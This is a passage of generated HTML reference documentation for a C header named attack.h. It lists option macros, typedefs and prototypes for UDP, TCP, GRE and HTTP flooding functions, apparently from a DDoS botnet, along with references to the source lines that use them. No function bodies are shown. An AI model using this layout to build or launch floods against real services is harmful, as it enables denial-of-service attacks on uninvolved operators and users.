<tr class="memitem:a7afb6e2da31b70aad81a3a8c4cce03ac"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a7afb6e2da31b70aad81a3a8c4cce03ac">HTTP_COOKIE_MAX</a>&#160;&#160;&#160;5</td></tr>
<tr class="separator:a7afb6e2da31b70aad81a3a8c4cce03ac"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a843d2259e52b51843a2abe0bfb764dc4"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a843d2259e52b51843a2abe0bfb764dc4">HTTP_COOKIE_LEN_MAX</a>&#160;&#160;&#160;128</td></tr>
<tr class="separator:a843d2259e52b51843a2abe0bfb764dc4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af6a49c502e37f3f5dfc390f758dedc38"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#af6a49c502e37f3f5dfc390f758dedc38">HTTP_POST_MAX</a>&#160;&#160;&#160;512</td></tr>
<tr class="separator:af6a49c502e37f3f5dfc390f758dedc38"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af9036def147b9e5de7a7b981f1d6212e"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#af9036def147b9e5de7a7b981f1d6212e">HTTP_PROT_DOSARREST</a>&#160;&#160;&#160;1</td></tr>
<tr class="separator:af9036def147b9e5de7a7b981f1d6212e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a358ec495035a144be684ef619051366b"><td class="memItemLeft" align="right" valign="top">#define&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a358ec495035a144be684ef619051366b">HTTP_PROT_CLOUDFLARE</a>&#160;&#160;&#160;2</td></tr>
<tr class="separator:a358ec495035a144be684ef619051366b"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="typedef-members"></a>
Typedefs</h2></td></tr>
<tr class="memitem:a5eb6c3d025947541be2af2b80b9b655a"><td class="memItemLeft" align="right" valign="top">typedef void(*&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>) (uint8_t, struct <a class="el" href="structattack__target.html">attack_target</a> *, uint8_t, struct <a class="el" href="structattack__option.html">attack_option</a> *)</td></tr>
<tr class="separator:a5eb6c3d025947541be2af2b80b9b655a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0fb3d519486301242753dc8e7f175683"><td class="memItemLeft" align="right" valign="top">typedef uint8_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a0fb3d519486301242753dc8e7f175683">ATTACK_VECTOR</a></td></tr>
<tr class="separator:a0fb3d519486301242753dc8e7f175683"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="func-members"></a>
Functions</h2></td></tr>
<tr class="memitem:ad99d6dee9df7ab3929a42a3e011cbf3b"><td class="memItemLeft" align="right" valign="top"><a class="el" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#ad99d6dee9df7ab3929a42a3e011cbf3b">attack_init</a> (void)</td></tr>
<tr class="separator:ad99d6dee9df7ab3929a42a3e011cbf3b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acf00fa745202d52753ab2b2b9b7b1e09"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#acf00fa745202d52753ab2b2b9b7b1e09">attack_kill_all</a> (void)</td></tr>
<tr class="separator:acf00fa745202d52753ab2b2b9b7b1e09"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aaa329d2cc3ef50d00c6cd7a6fb5ba012"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#aaa329d2cc3ef50d00c6cd7a6fb5ba012">attack_parse</a> (char *, int)</td></tr>
<tr class="separator:aaa329d2cc3ef50d00c6cd7a6fb5ba012"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a42afdcda258817e44bbc312dc6a1cc70"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a42afdcda258817e44bbc312dc6a1cc70">attack_start</a> (int, <a class="el" href="attack_8h.html#a0fb3d519486301242753dc8e7f175683">ATTACK_VECTOR</a>, uint8_t, struct <a class="el" href="structattack__target.html">attack_target</a> *, uint8_t, struct <a class="el" href="structattack__option.html">attack_option</a> *)</td></tr>
<tr class="separator:a42afdcda258817e44bbc312dc6a1cc70"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad389b7d3f1e1c0dff3b8d01afa578621"><td class="memItemLeft" align="right" valign="top">char *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#ad389b7d3f1e1c0dff3b8d01afa578621">attack_get_opt_str</a> (uint8_t, struct <a class="el" href="structattack__option.html">attack_option</a> *, uint8_t, char *)</td></tr>
<tr class="separator:ad389b7d3f1e1c0dff3b8d01afa578621"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aad968465446f65102936f40cdafb4c53"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#aad968465446f65102936f40cdafb4c53">attack_get_opt_int</a> (uint8_t, struct <a class="el" href="structattack__option.html">attack_option</a> *, uint8_t, int)</td></tr>
<tr class="separator:aad968465446f65102936f40cdafb4c53"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3baf28bba3efc90dbba2c6bad5a6a51d"><td class="memItemLeft" align="right" valign="top">uint32_t&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a3baf28bba3efc90dbba2c6bad5a6a51d">attack_get_opt_ip</a> (uint8_t, struct <a class="el" href="structattack__option.html">attack_option</a> *, uint8_t, uint32_t)</td></tr>
<tr class="separator:a3baf28bba3efc90dbba2c6bad5a6a51d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a793fdfa64aaad657551cc649e2988a81"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a793fdfa64aaad657551cc649e2988a81">attack_udp_generic</a> (uint8_t, struct <a class="el" href="structattack__target.html">attack_target</a> *, uint8_t, struct <a class="el" href="structattack__option.html">attack_option</a> *)</td></tr>
<tr class="separator:a793fdfa64aaad657551cc649e2988a81"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a12573f0d31b49ed03a25a6bee68cd37f"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a12573f0d31b49ed03a25a6bee68cd37f">attack_udp_vse</a> (uint8_t, struct <a class="el" href="structattack__target.html">attack_target</a> *, uint8_t, struct <a class="el" href="structattack__option.html">attack_option</a> *)</td></tr>
<tr class="separator:a12573f0d31b49ed03a25a6bee68cd37f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa6e206675e668d9ef1a931bdac2cb42e"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#aa6e206675e668d9ef1a931bdac2cb42e">attack_udp_dns</a> (uint8_t, struct <a class="el" href="structattack__target.html">attack_target</a> *, uint8_t, struct <a class="el" href="structattack__option.html">attack_option</a> *)</td></tr>
<tr class="separator:aa6e206675e668d9ef1a931bdac2cb42e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a02ff8d6a614d729c46bae7cd348e511e"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a02ff8d6a614d729c46bae7cd348e511e">attack_udp_plain</a> (uint8_t, struct <a class="el" href="structattack__target.html">attack_target</a> *, uint8_t, struct <a class="el" href="structattack__option.html">attack_option</a> *)</td></tr>
<tr class="separator:a02ff8d6a614d729c46bae7cd348e511e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5fa5ce92d7cd276d0cf13922eddf1e6d"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a5fa5ce92d7cd276d0cf13922eddf1e6d">attack_tcp_syn</a> (uint8_t, struct <a class="el" href="structattack__target.html">attack_target</a> *, uint8_t, struct <a class="el" href="structattack__option.html">attack_option</a> *)</td></tr>
<tr class="separator:a5fa5ce92d7cd276d0cf13922eddf1e6d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a56a3bedfd2e2500ecdaff5edc2bcbc18"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a56a3bedfd2e2500ecdaff5edc2bcbc18">attack_tcp_ack</a> (uint8_t, struct <a class="el" href="structattack__target.html">attack_target</a> *, uint8_t, struct <a class="el" href="structattack__option.html">attack_option</a> *)</td></tr>
<tr class="separator:a56a3bedfd2e2500ecdaff5edc2bcbc18"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aff68f7c623b860ed728b0343b955e1a4"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#aff68f7c623b860ed728b0343b955e1a4">attack_tcp_stomp</a> (uint8_t, struct <a class="el" href="structattack__target.html">attack_target</a> *, uint8_t, struct <a class="el" href="structattack__option.html">attack_option</a> *)</td></tr>
<tr class="separator:aff68f7c623b860ed728b0343b955e1a4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af64bc1071be075031eb42fc6635fd5fa"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#af64bc1071be075031eb42fc6635fd5fa">attack_gre_ip</a> (uint8_t, struct <a class="el" href="structattack__target.html">attack_target</a> *, uint8_t, struct <a class="el" href="structattack__option.html">attack_option</a> *)</td></tr>
<tr class="separator:af64bc1071be075031eb42fc6635fd5fa"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acffffc5cd4b1d6c59581a487a63edc07"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#acffffc5cd4b1d6c59581a487a63edc07">attack_gre_eth</a> (uint8_t, struct <a class="el" href="structattack__target.html">attack_target</a> *, uint8_t, struct <a class="el" href="structattack__option.html">attack_option</a> *)</td></tr>
<tr class="separator:acffffc5cd4b1d6c59581a487a63edc07"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:adcc43340092d63d4b7144999251abb07"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#adcc43340092d63d4b7144999251abb07">attack_app_proxy</a> (uint8_t, struct <a class="el" href="structattack__target.html">attack_target</a> *, uint8_t, struct <a class="el" href="structattack__option.html">attack_option</a> *)</td></tr>
<tr class="separator:adcc43340092d63d4b7144999251abb07"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4b75221461ff0dc40c8199b5c2353a81"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a4b75221461ff0dc40c8199b5c2353a81">attack_app_http</a> (uint8_t, struct <a class="el" href="structattack__target.html">attack_target</a> *, uint8_t, struct <a class="el" href="structattack__option.html">attack_option</a> *)</td></tr>
<tr class="separator:a4b75221461ff0dc40c8199b5c2353a81"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aff031d9300a6664f36089b134a04e8e6"><td class="memItemLeft" align="right" valign="top">static void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#aff031d9300a6664f36089b134a04e8e6">add_attack</a> (<a class="el" href="attack_8h.html#a0fb3d519486301242753dc8e7f175683">ATTACK_VECTOR</a>, <a class="el" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>)</td></tr>
<tr class="separator:aff031d9300a6664f36089b134a04e8e6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa6ce0f2afc8608824628d8881147f8f9"><td class="memItemLeft" align="right" valign="top">static void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#aa6ce0f2afc8608824628d8881147f8f9">free_opts</a> (struct <a class="el" href="structattack__option.html">attack_option</a> *, int)</td></tr>
<tr class="separator:aa6ce0f2afc8608824628d8881147f8f9"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="var-members"></a>
Variables</h2></td></tr>
<tr class="memitem:a2ef6e6642ad56d17bf71d5579da924d9"><td class="memItemLeft" align="right" valign="top">struct <a class="el" href="structattack__target.html">attack_target</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="attack_8h.html#a2ef6e6642ad56d17bf71d5579da924d9">__attribute__</a></td></tr>
<tr class="separator:a2ef6e6642ad56d17bf71d5579da924d9"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table>
<h2 class="groupheader">Macro Definition Documentation</h2>
<a class="anchor" id="a61c202b303f42c57328c999b1104877d"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_ACK&#160;&#160;&#160;12</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00058">58</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, <a class="el" href="attack__tcp_8c_source.html#l00293">attack_tcp_stomp()</a>, and <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>.</p>

</div>
</div>
<a class="anchor" id="a0fcd18d4c1705cc62b8a2d3f92e0a780"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_ACKRND&#160;&#160;&#160;18</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00064">64</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, and <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>.</p>

</div>
</div>
<a class="anchor" id="ab4c96458d5b368729fc078a755d9b70d"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_CONNS&#160;&#160;&#160;24</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00070">70</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00855">attack_app_cfnull()</a>, and <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<a class="anchor" id="a6fb76834fa13fd65a0021d1860b6c1d6"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_DNS_HDR_ID&#160;&#160;&#160;9</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00055">55</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__udp_8c_source.html#l00230">attack_udp_dns()</a>.</p>

</div>
</div>
<a class="anchor" id="a4c326567294cc6655e9f6a380c7f736f"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_DOMAIN&#160;&#160;&#160;8</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00054">54</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00855">attack_app_cfnull()</a>, <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>, and <a class="el" href="attack__udp_8c_source.html#l00230">attack_udp_dns()</a>.</p>

</div>
</div>
<a class="anchor" id="ab8471c4c3e703d3c9ee4e971c48ba5fb"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_DPORT&#160;&#160;&#160;7</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00053">53</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>, <a class="el" href="attack__gre_8c_source.html#l00162">attack_gre_eth()</a>, <a class="el" href="attack__gre_8c_source.html#l00020">attack_gre_ip()</a>, <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, <a class="el" href="attack__tcp_8c_source.html#l00293">attack_tcp_stomp()</a>, <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>, <a class="el" href="attack__udp_8c_source.html#l00230">attack_udp_dns()</a>, <a class="el" href="attack__udp_8c_source.html#l00025">attack_udp_generic()</a>, <a class="el" href="attack__udp_8c_source.html#l00375">attack_udp_plain()</a>, and <a class="el" href="attack__udp_8c_source.html#l00129">attack_udp_vse()</a>.</p>

</div>
</div>
<a class="anchor" id="a2ad2949e3a473ebba047e474abf5d461"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_FIN&#160;&#160;&#160;16</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00062">62</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, <a class="el" href="attack__tcp_8c_source.html#l00293">attack_tcp_stomp()</a>, and <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>.</p>

</div>
</div>
<a class="anchor" id="a47ac28075825da3fec16777b2395f331"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_GRE_CONSTIP&#160;&#160;&#160;19</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00065">65</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__gre_8c_source.html#l00162">attack_gre_eth()</a>, and <a class="el" href="attack__gre_8c_source.html#l00020">attack_gre_ip()</a>.</p>

</div>
</div>
<a class="anchor" id="a7e7e7167fbd2f6562151eeb9770943b3"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_HTTPS&#160;&#160;&#160;23</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00069">69</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

</div>
</div>
<a class="anchor" id="a57162ecbd3f7644a8f6a6b58aa4f8596"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_IP_DF&#160;&#160;&#160;5</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00051">51</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__gre_8c_source.html#l00162">attack_gre_eth()</a>, <a class="el" href="attack__gre_8c_source.html#l00020">attack_gre_ip()</a>, <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, <a class="el" href="attack__tcp_8c_source.html#l00293">attack_tcp_stomp()</a>, <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>, <a class="el" href="attack__udp_8c_source.html#l00230">attack_udp_dns()</a>, <a class="el" href="attack__udp_8c_source.html#l00025">attack_udp_generic()</a>, and <a class="el" href="attack__udp_8c_source.html#l00129">attack_udp_vse()</a>.</p>

</div>
</div>
<a class="anchor" id="aecb175215ca3d0ce5017cd8cedb7e0fe"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_IP_IDENT&#160;&#160;&#160;3</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00049">49</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__gre_8c_source.html#l00162">attack_gre_eth()</a>, <a class="el" href="attack__gre_8c_source.html#l00020">attack_gre_ip()</a>, <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, <a class="el" href="attack__tcp_8c_source.html#l00293">attack_tcp_stomp()</a>, <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>, <a class="el" href="attack__udp_8c_source.html#l00230">attack_udp_dns()</a>, <a class="el" href="attack__udp_8c_source.html#l00025">attack_udp_generic()</a>, and <a class="el" href="attack__udp_8c_source.html#l00129">attack_udp_vse()</a>.</p>

</div>
</div>
<a class="anchor" id="a1ac4210e00c74506c31642a74e3fc1c7"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_IP_TOS&#160;&#160;&#160;2</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00048">48</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__gre_8c_source.html#l00162">attack_gre_eth()</a>, <a class="el" href="attack__gre_8c_source.html#l00020">attack_gre_ip()</a>, <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, <a class="el" href="attack__tcp_8c_source.html#l00293">attack_tcp_stomp()</a>, <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>, <a class="el" href="attack__udp_8c_source.html#l00230">attack_udp_dns()</a>, <a class="el" href="attack__udp_8c_source.html#l00025">attack_udp_generic()</a>, and <a class="el" href="attack__udp_8c_source.html#l00129">attack_udp_vse()</a>.</p>

</div>
</div>
<a class="anchor" id="acfa2ed8a557040aed04b6c9346aa0eb9"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_IP_TTL&#160;&#160;&#160;4</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00050">50</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__gre_8c_source.html#l00162">attack_gre_eth()</a>, <a class="el" href="attack__gre_8c_source.html#l00020">attack_gre_ip()</a>, <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, <a class="el" href="attack__tcp_8c_source.html#l00293">attack_tcp_stomp()</a>, <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>, <a class="el" href="attack__udp_8c_source.html#l00230">attack_udp_dns()</a>, <a class="el" href="attack__udp_8c_source.html#l00025">attack_udp_generic()</a>, and <a class="el" href="attack__udp_8c_source.html#l00129">attack_udp_vse()</a>.</p>

</div>
</div>
<a class="anchor" id="ac0ce7d29746181bb91fd95569c625f9f"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_METHOD&#160;&#160;&#160;20</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00066">66</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<a class="anchor" id="af614bdd4374d1ecf0ba5bb48a8cb4e65"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_PATH&#160;&#160;&#160;22</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00068">68</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<a class="anchor" id="ac8d9ef7cc50e5b0e43f50b087c4c7104"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_PAYLOAD_RAND&#160;&#160;&#160;1</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00047">47</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__gre_8c_source.html#l00162">attack_gre_eth()</a>, <a class="el" href="attack__gre_8c_source.html#l00020">attack_gre_ip()</a>, <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, <a class="el" href="attack__tcp_8c_source.html#l00293">attack_tcp_stomp()</a>, <a class="el" href="attack__udp_8c_source.html#l00025">attack_udp_generic()</a>, and <a class="el" href="attack__udp_8c_source.html#l00375">attack_udp_plain()</a>.</p>

</div>
</div>
<a class="anchor" id="aacac129514ea3914af56b5eb4c71f8c6"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_PAYLOAD_SIZE&#160;&#160;&#160;0</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00046">46</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__gre_8c_source.html#l00162">attack_gre_eth()</a>, <a class="el" href="attack__gre_8c_source.html#l00020">attack_gre_ip()</a>, <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, <a class="el" href="attack__tcp_8c_source.html#l00293">attack_tcp_stomp()</a>, <a class="el" href="attack__udp_8c_source.html#l00230">attack_udp_dns()</a>, <a class="el" href="attack__udp_8c_source.html#l00025">attack_udp_generic()</a>, and <a class="el" href="attack__udp_8c_source.html#l00375">attack_udp_plain()</a>.</p>

</div>
</div>
<a class="anchor" id="aa069ca3abf2026e0e48d8f06ad47437c"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_POST_DATA&#160;&#160;&#160;21</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00067">67</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<a class="anchor" id="a5ae76926414352bb8e12896c5581a0fd"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_PSH&#160;&#160;&#160;13</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00059">59</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, <a class="el" href="attack__tcp_8c_source.html#l00293">attack_tcp_stomp()</a>, and <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>.</p>

</div>
</div>
<a class="anchor" id="a4464ea34ef73875f57b5c6a412aaac20"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_RST&#160;&#160;&#160;14</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00060">60</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, <a class="el" href="attack__tcp_8c_source.html#l00293">attack_tcp_stomp()</a>, and <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>.</p>

</div>
</div>
<a class="anchor" id="a97b7c19adba8f5e25d603d4fcd80c995"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_SEQRND&#160;&#160;&#160;17</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00063">63</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, and <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>.</p>

</div>
</div>
<a class="anchor" id="a9b14feb6720fefac0c6da63a77da718e"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_SOURCE&#160;&#160;&#160;25</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00071">71</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

